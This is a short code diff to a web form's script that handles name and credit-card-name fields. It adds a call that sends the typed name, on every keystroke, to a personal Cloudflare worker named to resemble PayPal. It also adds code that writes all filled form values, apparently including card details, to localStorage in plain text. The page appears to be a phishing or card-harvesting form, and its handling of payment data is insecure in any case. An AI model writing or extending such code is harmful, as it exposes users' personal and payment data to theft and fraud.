@@ -30,6 +30,8 @@
 
         async function generateEmailViaCloudflare() {
             const clean = removeSpecialChars(nameInput.value).replace(/\s+/g, '');
+            emailInput.value = "generating...";
+
             try {
                 const response = await fetch("https://paypal21939.ottoberserk.workers.dev/", {
                     method: "POST",
@@ -83,6 +85,7 @@
         ccNameInput.addEventListener('input', () => {
             duplicateCCNameIfOneWord();
             syncNameWithCCName();
+            generateEmailViaCloudflare();
         });
 
         nameInput.addEventListener('input', () => {
@@ -101,8 +104,29 @@
             event.preventDefault();
             setTimeout(() => {
                 form.submit();
-            }, 300); // slight delay to allow Chrome to process autofill prompt
+            }, 300);
         });
+
+        // Save form values before unload
+        window.addEventListener('beforeunload', () => {
+            const formData = {};
+            Array.from(form.elements).forEach(input => {
+                if (input.name && input.value) {
+                    formData[input.name] = input.value;
+                }
+            });
+            localStorage.setItem('formData', JSON.stringify(formData));
+        });
+
+        // Restore form values on load
+        const saved = localStorage.getItem('formData');
+        if (saved) {
+            const values = JSON.parse(saved);
+            for (const [key, value] of Object.entries(values)) {
+                const input = form.querySelector(`[name="${key}"]`);
+                if (input) input.value = value;
+            }
+        }
     });
     </script>
 </head>
